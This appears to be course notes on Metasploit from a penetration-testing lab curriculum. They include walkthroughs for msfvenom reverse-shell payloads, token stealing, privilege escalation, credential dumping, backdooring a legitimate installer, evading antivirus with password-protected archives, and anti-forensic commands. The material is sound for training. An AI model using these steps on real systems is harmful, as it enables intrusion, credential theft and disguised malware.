**Plugins** are third-party software integrations approved for inclusion in the Metasploit Framework — sometimes limited "community editions" of commercial products, sometimes independent community projects. They streamline workflows by automatically documenting results into msfconsole's database (hosts, services, vulnerabilities) rather than requiring manual import/export cycles between separate tools. Plugins interact directly with the Framework's API, enabling task automation, new commands, and extended functionality.

### 9.1 Using Plugins
**Step-by-step:**
1. Confirm the plugin is installed in the default directory:
   ```shellsession
   ls /usr/share/metasploit-framework/plugins
   ```
2. Load it from within msfconsole:
   ```shellsession
   load nessus
   ```
   - On success, shows a confirmation message (e.g., "Successfully loaded Plugin: Nessus") and often a hint for a help command specific to that plugin (e.g., `nessus_help`).
3. View the plugin's added commands:
   ```shellsession
   nessus_help
   ```
   Lists plugin-specific commands (e.g., `nessus_connect`, `nessus_login`, `nessus_policy_list`, etc.).
4. If the plugin isn't correctly installed, loading it fails with an explicit error naming the missing file path.

### 9.2 Installing New Plugins
Popular plugins are bundled with regular Parrot OS updates. To manually install a plugin not included by default:

**Step-by-step:**
1. Download the plugin's `.rb` file(s) from its source (e.g., via `git clone`):
   ```shellsession
   git clone https://github.com/darkoperator/Metasploit-Plugins
   ls Metasploit-Plugins
   ```
2. Copy the desired plugin file into Metasploit's plugin directory:
   ```shellsession
   sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
   ```
3. Launch msfconsole and load it:
   ```shellsession
   msfconsole -q
   load pentest
   ```
4. Confirm it loaded — the plugin's custom banner/version appears, and running `help` now shows additional command categories contributed by the plugin (e.g., Tradecraft, auto_exploit, Discovery, Project, Postauto commands).

Popular pre-installed/well-known plugins mentioned include nMap, NexPose, Nessus, Mimikatz (v1), Stdapi, Railgun, Priv, Incognito, and DarkOperator's plugin set.

### 9.3 Mixins
**Mixins** are a Ruby language feature — classes that act as reusable methods for other classes **without** requiring traditional parent-child inheritance; this is technically called "inclusion" rather than inheritance. They're used when you want to add many optional features to a class, or share one feature across many unrelated classes. In Ruby, mixins are implemented as **Modules**, added via the `include` keyword followed by the module's name. New users of Metasploit don't need to worry about mixins directly, but they're foundational to how the Framework's codebase achieves flexibility and modular customization.

---

## Section 10: Sessions

msfconsole can manage multiple active modules simultaneously using **Sessions**, each acting as a dedicated control interface for a deployed module/connection. Sessions can be switched between, linked to new modules, or converted into background jobs. A backgrounded session continues running and the target connection persists — but a session can "die" if something interrupts the payload's runtime communication channel.

### 10.1 Using Sessions
**Step-by-step (backgrounding and managing sessions):**
1. While interacting with an active exploit/session, press **CTRL+Z** (or type `background` for Meterpreter) to send it to the background. You'll be prompted to confirm.
2. List all active sessions:
   ```shellsession
   sessions
   ```
   Shows each session's ID, name, type (e.g., `meterpreter x86/windows`), current privilege/user info, and connection details.
3. Re-enter a specific session:
   ```shellsession
   sessions -i 1
   ```
   - `-i <no.>` — interacts with the session matching that ID, dropping you back into its shell/Meterpreter prompt.
4. To run a second module (commonly a **post-exploitation** module) against an already-compromised session: background the current session, search for the new module, load it, and set its `SESSION` option to the target session's index number in its `show options` menu.

Post-exploitation modules commonly include credential gatherers, local exploit suggesters, and internal network scanners.

### 10.2 Jobs
If an exploit is actively running on a port needed by a different module, simply pressing **CTRL+C** won't free the port — the `jobs` command is needed to view and terminate background tasks properly.

**Command explained:**
```shellsession
jobs -h
```
Shows job management options: `-K` (kill all jobs), `-P` (persist jobs on restart), `-S <opt>` (search filter), `-i <opt>` (detailed info on a job), `-k <opt>` (kill specific job by ID/range), `-l` (list all jobs), `-p <opt>` (add persistence to a job by ID), `-v` (verbose output).

```shellsession
exploit -j
```
- `-j` — runs the exploit "in the context of a job," i.e., in the background, rather than interactively in the foreground. Example output: `[*] Exploit running as background job 0.`

**Step-by-step:**
1. Launch the exploit as a job: `exploit -j`.
2. List running jobs: `jobs -l` — shows each job's ID, name, payload, and payload options (e.g., listener address/port).
3. Kill a specific job by its index: `kill [index no.]`.
4. Kill all running jobs at once: `jobs -K`.

---

## Section 11: Meterpreter

**Meterpreter** is Metasploit's signature multi-faceted, extensible payload, using DLL injection for a stable, stealthy, and optionally persistent connection. It resides entirely in memory (no disk writes), making forensic detection difficult. Its core design goals are to be **Stealthy**, **Powerful**, and **Extensible** — effectively making it a "swiss army knife" for post-exploitation: privilege escalation research, AV evasion, vulnerability research, persistence, and pivoting.

### 11.1 Running Meterpreter
To use Meterpreter, select any Meterpreter payload variant appropriate to the target connection type/OS from `show payloads`. When an exploit using it completes successfully, the following sequence occurs:
1. The target executes the initial **stager** (bind, reverse, findtag, passivex, etc.).
2. The stager loads a DLL prefixed with "Reflective" — a reflective stub handles loading/injecting this DLL without touching disk.
3. The Meterpreter core initializes, establishes an **AES-encrypted** link over the socket, and sends a GET request that Metasploit uses to configure the client.
4. Meterpreter loads extensions — always `stdapi`, and `priv` if administrative rights were obtained — all communicated over AES encryption.

Once received, `help` reveals the full command catalog (Core, File system, Networking, System, User interface, Webcam, Audio Output, Elevate/Priv, and Password database commands).

### 11.2 Stealthy
Meterpreter resides fully in memory and writes nothing to disk; no new separate process is created since it injects itself into a compromised process, and it can **migrate** between running processes as needed. Since msfconsole v6, all Meterpreter traffic between target and attacker is AES-encrypted for confidentiality/integrity. Together, these properties leave minimal forensic evidence and limited impact on the victim machine.

### 11.3 Powerful
Meterpreter uses a **channelized** communication system between target and attacker — for example, spawning a host-OS shell inside the Meterpreter session opens a dedicated channel for it, and this traffic also benefits from AES encryption.

### 11.4 Extensible
Meterpreter's feature set can be augmented at runtime and loaded over the network, since its modular structure allows new functionality to be added without recompiling or rebuilding the payload itself.

### 11.5 Using Meterpreter
**Step-by-step (a full example workflow: scan → exploit → escalate → loot):**
1. Scan the target directly from msfconsole:
   ```shellsession
   db_nmap -sV -p- -T5 -A 10.10.10.15
   ```
   - `-p-` — scans all 65535 ports.
   - `-T5` — fastest timing template.
   - `-A` — enables aggressive scan (OS detection, version detection, script scanning, traceroute).
2. Review the auto-populated `hosts`/`services` database tables.
3. Investigate discovered services manually (e.g., visiting a web port in a browser) and research the detected software version (e.g., Microsoft IIS httpd 6.0) for known CVEs.
4. Search for and load a matching exploit module, e.g.:
   ```shellsession
   search iis_webdav_upload_asp
   use 0
   ```
5. Configure required options and run:
   ```shellsession
   set RHOST 10.10.10.15
   set LHOST tun0
   run
   ```
6. On success, you land in a `meterpreter >` prompt. If a privilege check fails (e.g., `getuid` returns "Access is denied"), investigate running processes:
   ```shellsession
   ps
   ```
7. Steal a token from a more privileged process to gain its context:
   ```shellsession
   steal_token 1836
   ```
   - `steal_token <PID>` — impersonates the access token of the process with the given PID, raising your effective privilege level (e.g., to `NT AUTHORITY\NETWORK SERVICE`).
8. Background the session and run the **Local Exploit Suggester** to find privilege escalation candidates:
   ```shellsession
   bg
   search local_exploit_suggester
   use 0
   set SESSION 1
   run
   ```
   - This module checks the target against many known local privilege escalation exploits and reports which ones appear applicable.
9. Use one of the suggested exploits (e.g., `ms15_051_client_copy_image`) against the same session:
   ```shellsession
   use exploit/windows/local/ms15_051_client_copy_image
   set session 1
   set LHOST tun0
   run
   ```
10. Confirm elevated privileges:
    ```shellsession
    getuid
    ```
    (e.g., returning `NT AUTHORITY\SYSTEM`).
11. Extract credential material for further use/pivoting:
    ```shellsession
    hashdump
    lsa_dump_sam
    lsa_dump_secrets
    ```
    - `hashdump` — dumps NTLM/LM password hashes from the SAM database.
    - `lsa_dump_sam` — dumps SAM data via the LSA (Local Security Authority) subsystem, including per-user hash details.
    - `lsa_dump_secrets` — dumps LSA secrets, which can include service account passwords and other sensitive stored credentials.

This captured "loot" can then be used to pivot deeper into a network, access internal resources, or impersonate higher-privileged users if the broader network's security posture is weak.

---

## Section 12: Writing and Importing Modules

New Metasploit modules can be obtained either by fully updating msfconsole (pulling in everything merged into the official GitHub branch) or, for a single needed module, by downloading and manually installing just that one file — commonly sourced from **ExploitDB**.

### 12.1 Porting Over Scripts into Metasploit Modules
ExploitDB lets you filter specifically for exploits tagged **"Metasploit Framework (MSF)"**, meaning a ready-to-use `.rb` module file is available for direct download and import.

**Command explained:**
```shellsession
searchsploit nagios3
```
- `searchsploit` — the CLI tool for searching a local mirror of the ExploitDB database.
- `nagios3` — the search term; returns matching exploit titles and their relative file paths.

```shellsession
searchsploit -t Nagios3 --exclude=".py"
```
- `-t` — searches only in exploit **titles** (more precise than full-text search).
- `--exclude=".py"` — excludes results with a `.py` extension, helpful for filtering down to only Metasploit-compatible `.rb` files (though not all `.rb` files are automatically MSF-compatible modules).

**Step-by-step (installing a downloaded module):**
1. Identify the target module directory structure, e.g.:
   ```shellsession
   ls /usr/share/metasploit-framework/
   ls .msf4/
   ```
   The `.msf4` hidden folder in the user's home directory mirrors parts of the main framework structure and may need additional subfolders created (`mkdir`) to match.
2. Copy the downloaded `.rb` file into the correct module category folder, following strict naming conventions (snake_case, alphanumeric + underscores, no dashes):
   ```shellsession
   cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
   ```
3. Load the new module at msfconsole startup via a custom module path:
   ```shellsession
   msfconsole -m /usr/share/metasploit-framework/modules/
   ```
   - `-m <path>` — adds an additional module search path at launch.
4. Alternatively, reload modules from inside an already-running msfconsole:
   ```shellsession
   loadpath /usr/share/metasploit-framework/modules/
   ```
   or
   ```shellsession
   reload_all
   ```
   - `reload_all` — rescans all module directories for new/changed files without restarting msfconsole.
5. Confirm the module is recognized:
   ```shellsession
   use exploit/unix/webapp/nagios3_command_injection
   show options
   ```

### 12.2 Writing Our Module
Writing or porting a custom module requires Ruby programming knowledge; Metasploit Ruby modules conventionally use **hard tabs** for indentation. Rather than starting from scratch, it's recommended to copy and adapt an existing module from the relevant category as boilerplate.

**Code explained (module includes/mixins):**
```ruby
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::PhpEXE
include Msf::Exploit::FileDropper
include Msf::Auxiliary::Report
```
| Mixin | Function |
|---|---|
| `Msf::Exploit::Remote::HttpClient` | Provides methods for acting as an HTTP client against a target server. |
| `Msf::Exploit::PhpEXE` | Generates a first-stage PHP payload. |
| `Msf::Exploit::FileDropper` | Handles uploading files and cleaning them up after the session ends. |
| `Msf::Auxiliary::Report` | Reports gathered data back to the Metasploit database. |

Unneeded mixins (e.g., `FileDropper` if the port-over doesn't involve file cleanup) should be removed to keep the module lean.

**Step-by-step (building the module's metadata and options):**
1. Fill in the `initialize` method's info block: `Name`, `Description`, `License`, `Author` (crediting original discoverer and the porter), `References` (CVE IDs, URLs), `Platform`, `Arch`, `Notes` (side effects, reliability, stability), `Targets`, `Privileged`, `DisclosureDate`, and `DefaultTarget`.
2. Define user-configurable options with `register_options`, e.g.:
   ```ruby
   register_options([
     OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
     OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
     OptPath.new('PASSWORDS', [true, 'The list of passwords',
         File.join(Msf::Config.data_directory, "wordlists", "passwords.txt")])
   ])
   ```
   - `OptString.new` — defines a required/optional string-type option with a default value.
   - `OptPath.new` — defines a file-path option, here defaulting to a bundled wordlist location.
3. Write the actual exploit logic (e.g., functions like `get_csrf`, `auth_ok?`, and `bruteforce_auth` in the Bludit brute-force example), adapting the original script's logic into Ruby methods compatible with Metasploit's client/session objects.

For deeper learning, the module recommends the book *Metasploit: A Penetration Tester's Guide* (No Starch Press) and Rapid7's own blog posts on module development.

---

## Section 13: Introduction to MSFVenom

**MSFVenom** is the modern successor to the separate `msfpayload` + `msfencode` tools, merging payload generation and encoding into a single utility. It allows quickly crafting payloads for different target architectures/OS releases while cleaning up shellcode to avoid runtime errors. The module notes that signature-only AV detection is largely obsolete — modern AV uses heuristics, machine learning, and deep packet inspection, making simple encoding far less effective at evasion than it once was (demonstrated earlier with a 52/65 VirusTotal detection rate).

### 13.1 Creating Our Payloads
**Scenario:** An anonymous-access FTP server shares files with a linked web server's `/uploads` directory, and the web service has no restrictions on executable content types.

**Step-by-step:**
1. Scan the target:
   ```shellsession
   nmap -sV -T4 -p- 10.10.10.5
   ```
2. Connect to the FTP service anonymously:
   ```shellsession
   ftp 10.10.10.5
   ```
   Log in with username `anonymous` and any email-like string as the password.
3. List the FTP directory (`ls`) and identify clues about the server platform (e.g., an `aspnet_client` folder suggesting `.aspx` support).
4. Generate a matching reverse shell payload:
   ```shellsession
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
   ```
   - `-p` — payload module to use.
   - `-f aspx` — output format as an ASP.NET page.
   - `> reverse_shell.aspx` — redirects the generated payload into a file with that name.
5. Upload the generated file via FTP:
   ```shellsession
   put reverse_shell.aspx
   ```
6. Start a listener in msfconsole **before** triggering the payload:
   ```shellsession
   use multi/handler
   set LHOST 10.10.14.5
   set LPORT 1337
   run
   ```
   - `multi/handler` — a generic listener module that catches incoming connections matching the configured payload type, without needing to re-run an exploit.

### 13.2 Executing the Payload
**Step-by-step:**
1. Visit the uploaded payload's URL in a browser (e.g., `http://10.10.10.5/reverse_shell.aspx`) — this triggers execution; the page itself appears blank since the `.aspx` file contains no HTML.
2. Watch the `multi/handler` listener for an incoming Meterpreter session.
3. Confirm the compromised context:
   ```shellsession
   getuid
   ```
   (e.g., returning a low-privilege context like `IIS APPPOOL\Web`).
4. Note that Meterpreter sessions can sometimes die unexpectedly; if this happens frequently, try encoding the payload to improve stability/reliability.

### 13.3 Local Exploit Suggester
**Step-by-step (escalating privileges after landing as a low-priv user):**
1. Search for the Local Exploit Suggester module:
   ```shellsession
   search local exploit suggester
   ```
2. Load it and bind it to the current session:
   ```shellsession
   use post/multi/recon/local_exploit_suggester
   set session 2
   run
   ```
   This checks the target against dozens of known local privilege escalation vulnerabilities and reports which appear exploitable (e.g., `ms10_015_kitrap0d`, `ms13_053_schlamperei`).
3. Try one of the suggested modules, adjusting the listener port to avoid conflicts with the existing session:
   ```shellsession
   search kitrap0d
   use 0
   set LPORT 1338
   set SESSION 3
   run
   ```
4. On success, confirm the new privilege level:
   ```shellsession
   getuid
   ```
   (e.g., returning `NT AUTHORITY\SYSTEM`).

Not every suggested exploit will succeed (e.g., one might fail because the compromised user isn't in the right group) — trying candidates down the list until one works is expected practice.

---

## Section 14: Firewall and IDS/IPS Evasion

To attack a target efficiently and quietly, it's important to understand how it's likely defended. Two broad defense categories are introduced: **endpoint protection** and **perimeter protection**.

### 14.1 Endpoint Protection
**Endpoint protection** refers to localized software protecting a single host (PC, workstation, or server), typically bundling Antivirus, Antimalware (covering bloatware/spyware/adware/scareware/ransomware detection), Firewall, and Anti-DDoS features into one package. Familiar examples include Avast, Nod32, Malwarebytes, and BitDefender.

### 14.2 Perimeter Protection
**Perimeter protection** refers to physical or virtual devices sitting at a network's edge, controlling access between the outside (public) and inside (private) zones. A **De-Militarized Zone (DMZ)** often sits between these two — a lower-trust zone than the internal network but higher-trust than the open internet, typically hosting public-facing servers that are still internally managed and patched.

### 14.3 Security Policies
**Security policies** are the backbone of a network's security posture, functioning like Access Control Lists (ACLs) — ordered lists of allow/deny rules governing traffic and files. These can apply across several domains: Network Traffic Policies, Application Policies, User Access Control Policies, File Management Policies, and DDoS Protection Policies, among others. Multiple detection approaches determine how events are matched against these policies:
| Detection Method | Description |
|---|---|
| Signature-based Detection | Compares network packets against known attack patterns ("signatures"); a 100% match triggers an alert. |
| Heuristic / Statistical Anomaly Detection | Compares behavior against an established baseline, flagging deviations beyond a set threshold (including known APT patterns). |
| Stateful Protocol Analysis Detection | Flags divergence from pre-built profiles of generally accepted "normal" protocol behavior. |
| Live-monitoring and Alerting (SOC-based) | Human analysts in a Security Operations Center monitor live feeds and decide whether to act on or automate responses to alerts. |

### 14.4 Evasion Techniques
Most host-based antivirus still relies primarily on **signature-based detection**. As shown in the Encoders section, simply encoding payloads with multiple iterations is not sufficient against modern AV, and even establishing a communication channel can trigger IDS/IPS alarms. However, since MSF6, Meterpreter traffic is **AES-encrypted** end-to-end, which helps significantly against network-based IDS/IPS. In rare strict environments, traffic might still be flagged by source IP reputation — a historical real-world example cited is the **2017 Equifax breach**, where attackers used DNS exfiltration to slowly siphon data out undetected for months via the Apache Struts vulnerability.

Even with AES-encrypted, in-memory Meterpreter sessions, the **initial payload file** delivered to the target (before execution) can still be fingerprinted and blocked by signature-matching AV, since vendors actively study and add Metasploit's default payloads/modules to their signature databases.

**Command explained (backdooring a legitimate executable):**
```shellsession
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
- `-x <file>` — specifies a legitimate executable template to inject the payload into ("backdooring" it), hiding the malicious shellcode inside otherwise-normal application code.
- `-k` — "keep" flag; preserves the original program's normal execution while running the payload in a separate thread, so the application still appears to function normally to the victim.
- `-e x86/shikata_ga_nai -i 5` — encodes the payload with 5 iterations of SGN.
- `-o` — output file path, here overwriting the legitimate installer's filename to disguise it.

Note: even with `-k`, if the victim launches the backdoored executable from a CLI environment, a separate window may briefly appear for the payload, remaining until the session interaction finishes.

### 14.5 Archives
Placing a password on an archived payload bypasses many AV signature scans, since most AV engines cannot inspect inside password-protected archives. The downside is that locked/unscannable archives are often flagged as suspicious in an AV's alert dashboard for manual review.

**Step-by-step:**
1. Generate a raw encoded payload (e.g., as a `.js` file):
   ```shellsession
   msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
   ```
2. Check its baseline detection rate (e.g., via `msf-virustotal`).
3. Install the RAR utility and archive the payload with a password:
   ```shellsession
   wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
   tar -xzvf rarlinux-x64-612.tar.gz && cd rar
   rar a ~/test.rar -p ~/test.js
   ```
   - `rar a <archive> -p <file>` — creates (`a` = add) a new RAR archive, `-p` prompts for and sets a password.
4. Remove the `.rar` extension to further obscure the file type:
   ```shellsession
   mv test.rar test
   ```
5. Archive it a **second** time (double-archiving), again with a password, then strip the extension again:
   ```shellsession
   rar a test2.rar -p test
   mv test2.rar test2
   ```
6. Re-check detection rate on VirusTotal — double-archiving with passwords and stripped extensions typically drops detection dramatically (shown dropping to 0/49 in the example), since AV engines generally cannot scan inside nested, password-protected, unlabeled archives.

### 14.6 Packers
A **Packer** compresses an executable together with its decompression code into a single file; when run, the decompression code restores the original executable transparently, adding another evasion layer against static file-scanning. `msfvenom` supports compressing and restructuring backdoored executables this way, and can also encrypt the underlying process structure. Popular packer tools mentioned: UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida. (The PolyPack project is referenced for further study.)

### 14.7 Exploit Coding
When writing or porting exploit code, it's important the code isn't easily fingerprinted by security tooling — for example, a Buffer Overflow exploit's repetitive hexadecimal buffer patterns can be flagged by IDS/IPS systems watching network traffic.

**Code explained (randomizing a target's return-address offset):**
```ruby
'Targets' =>
[
    [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```
- `'Ret'` — the specific return address used for this target/version.
- `'Offset'` — the byte offset used in the exploit buffer; varying this (along with avoiding obvious NOP-sled patterns) helps break signature-based IDS/IPS detection of well-known exploit buffer patterns.

The NOP sled is the memory region reserved for the shellcode payload after a buffer overflow is triggered — both the overflow pattern and the NOP sled are regularly inspected by IPS/IDS systems, so custom exploit code should always be tested in a sandbox before use in a live client engagement (since a tester often only gets one real attempt).

### 14.8 A Note on Evasion
This section only introduces evasion concepts at a high level — later HTB Academy modules dig deeper into both theory and hands-on evasion technique. The module recommends practicing on older HTB machines or VMs running outdated Windows Defender/free AV engines, noting this is too broad a topic to fully cover in one section.

---

## Section 15: Metasploit-Framework Updates - August 2020

The August 2020 update to msfconsole introduced **MSF6**, which is a breaking change: upgrading renders all previously established **MSF5** payload sessions unusable, and payloads generated under MSF5 will not work with MSF6's new communication mechanisms. This section summarizes the key categories of change.

### 15.1 Generation Features
- **End-to-end encryption** across Meterpreter sessions for all five implementations: Windows, Python, Java, Mettle, and PHP.
- **SMBv3 client support**, enabling more modern exploitation workflows that rely on newer SMB protocol versions.
- A **new polymorphic payload generation routine** for Windows shellcode, improving evasive capabilities against common antivirus and IDS products by varying the generated code's structure each time.

### 15.2 Expanded Encryption
- Increased complexity for building signature-based detections against certain network operations and Metasploit's core payload binaries.
- **All Meterpreter payloads** now use AES encryption for attacker-target communication by default.
- **SMBv3 encryption integration** further increases the difficulty of building signature-based detections for key SMB operations.

### 15.3 Cleaner Payload Artifacts
- Windows Meterpreter DLLs now resolve required functions **by ordinal instead of by name**, making static analysis harder.
- The standard `ReflectiveLoader` export, previously present as readable text data in reflectively loadable DLLs, has been **removed** from payload binaries.
- Commands Meterpreter exposes to the Framework are now encoded as **integers instead of strings**, reducing readable signature material.

### 15.4 Plugins
The legacy **Mimikatz** Meterpreter extension was removed in favor of its successor, **Kiwi** — any attempt to load Mimikatz will now load Kiwi automatically going forward.

### 15.5 Payloads
The payload shellcode's **static generation routine** was replaced with a **randomization routine**, adding polymorphic properties by shuffling instructions around on each generation. The module points to Rapid7's official blog post ("Metasploit 6 is now under active development") for the complete changelog.

### 15.6 Closing Thoughts
The module closes by reaffirming Metasploit's value as a powerful, extensible, and often misunderstood part of a penetration tester's toolkit — strong for tracking assessment data, post-exploitation, and pivoting. It encourages hands-on experimentation to see whether Metasploit fits naturally into one's personal workflow, while also validating that it's perfectly fine to prefer other tools instead. For further practice, the module points to tagged HTB boxes, other Academy module targets, and the **Dante Pro Lab** (particularly useful for practicing Metasploit's pivoting capabilities).

---

## Cheatsheet

A quick command reference for this module.

### MSFconsole Commands
| Command | Description |
|---|---|
| `show exploits` | Show all exploits within the Framework. |
| `show payloads` | Show all payloads within the Framework. |
| `show auxiliary` | Show all auxiliary modules within the Framework. |
| `search <name>` | Search for exploits or modules within the Framework. |
| `info` | Load information about a specific exploit or module. |
| `use <name>` | Load an exploit or module (example: `use windows/smb/psexec`). |
| `use <number>` | Load an exploit by its index number from the `search` results. |
| `LHOST` | Your local host's IP address reachable by the target (used for reverse shells). |
| `RHOST` | The remote host/target. |
| `set <function>` | Set a specific value (e.g., LHOST or RHOST) for the current module. |
| `setg <function>` | Set a specific value globally, persisting across module switches. |
| `show options` | Show the options available for a module or exploit. |
| `show targets` | Show the platforms supported by the exploit. |
| `set target <number>` | Specify a target index if the OS and service pack are known. |
| `set payload <payload>` | Specify the payload to use. |
| `set payload <number>` | Specify the payload by index after `show payloads`. |
| `show advanced` | Show advanced options. |
| `set autorunscript migrate -f` | Automatically migrate to a separate process after exploit completion. |
| `check` | Determine whether a target is vulnerable to an attack. |
| `exploit` | Execute the module/exploit against the target. |
| `exploit -j` | Run the exploit as a background job. |
| `exploit -z` | Do not interact with the session after successful exploitation. |
| `exploit -e <encoder>` | Specify the payload encoder to use. |
| `exploit -h` | Display help for the exploit command. |
| `sessions -l` | List available sessions. |
| `sessions -l -v` | List sessions verbosely, including exploited vulnerability info. |
| `sessions -s <script>` | Run a specific Meterpreter script on all live sessions. |
| `sessions -K` | Kill all live sessions. |
| `sessions -c <cmd>` | Execute a command on all live Meterpreter sessions. |
| `sessions -u <sessionID>` | Upgrade a normal Win32 shell to a Meterpreter console. |
| `db_create <name>` | Create a database for database-driven attacks. |
| `db_connect <name>` | Create/connect to a database for driven attacks. |
| `db_nmap` | Run Nmap and record results automatically into the database. |
| `db_destroy` | Delete the current database. |
| `db_destroy <user:password@host:port/database>` | Delete a database using advanced connection options. |

### Meterpreter Commands
| Command | Description |
|---|---|
| `help` | Open Meterpreter usage help. |
| `run <scriptname>` | Run a Meterpreter-based script (see `scripts/meterpreter`). |
| `sysinfo` | Show system information on the compromised target. |
| `ls` | List files and folders on the target. |
| `use priv` | Load the privilege extension for extended Meterpreter libraries. |
| `ps` | Show running processes and their associated accounts. |
| `migrate <proc. id>` | Migrate to a specific process ID. |
| `use incognito` | Load incognito functions (token stealing/impersonation). |
| `list_tokens -u` | List available tokens by user. |
| `list_tokens -g` | List available tokens by group. |
| `impersonate_token <DOMAIN\USERNAME>` | Impersonate a token available on the target. |
| `steal_token <proc. id>` | Steal and impersonate a token from a given process. |
| `drop_token` | Stop impersonating the current token. |
| `getsystem` | Attempt to elevate to SYSTEM-level access via multiple vectors. |
| `shell` | Drop into an interactive shell with all available tokens. |
| `execute -f <cmd.exe> -i` | Execute cmd.exe and interact with it. |
| `execute -f <cmd.exe> -i -t` | Execute cmd.exe with all available tokens. |
| `execute -f <cmd.exe> -i -H -t` | Execute cmd.exe with all tokens as a hidden process. |
| `rev2self` | Revert to the original compromise-time user. |
| `reg <command>` | Interact with the target's registry (create/delete/query/set, etc.). |
| `setdesktop <number>` | Switch to a different screen based on logged-in user. |
| `screenshot` | Take a screenshot of the target's screen. |
| `upload <filename>` | Upload a file to the target. |
| `download <filename>` | Download a file from the target. |
| `keyscan_start` | Start sniffing keystrokes on the target. |
| `keyscan_dump` | Dump captured keystrokes. |
| `keyscan_stop` | Stop sniffing keystrokes. |
| `getprivs` | Get as many privileges as possible on the target. |
| `uictl enable <keyboard/mouse>` | Take control of the keyboard and/or mouse. |
| `background` | Run the current Meterpreter shell in the background. |
| `hashdump` | Dump all hashes on the target. |
| `use sniffer` | Load the sniffer module. |
| `sniffer_interfaces` | List available interfaces on the target. |
| `sniffer_dump <interfaceID> pcapname` | Start sniffing on the remote target. |
| `sniffer_start <interfaceID> packet-buffer` | Start sniffing with a specific packet buffer range. |
| `sniffer_stats <interfaceID>` | Get statistics from the sniffed interface. |
| `sniffer_stop <interfaceID>` | Stop the sniffer. |
| `add_user <username> <password> -h <ip>` | Add a user on the remote target. |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a user to the Domain Admins group. |
| `clearev` | Clear the event log on the target machine. |
| `timestomp` | Change file MACE attributes (anti-forensics). |
| `reboot` | Reboot the target machine. |

### MSFVenom Quick Reference
| Flag | Description |
|---|---|
| `-p <payload>` | Payload module to generate. |
| `-a <arch>` | Target architecture (x86, x64, etc.). |
| `--platform <os>` | Target platform (windows, linux, php, etc.). |
| `-f <format>` | Output format (exe, aspx, perl, elf, raw, etc.). |
| `-e <encoder>` | Encoder to apply (e.g., x86/shikata_ga_nai). |
| `-i <n>` | Number of encoding iterations. |
| `-b <bad chars>` | Bad characters to avoid in the payload. |
| `-x <template.exe>` | Legitimate executable to inject payload into ("backdooring"). |
| `-k` | Keep the original executable's normal functionality running in a separate thread. |
| `-o <file>` | Output file path/name. |
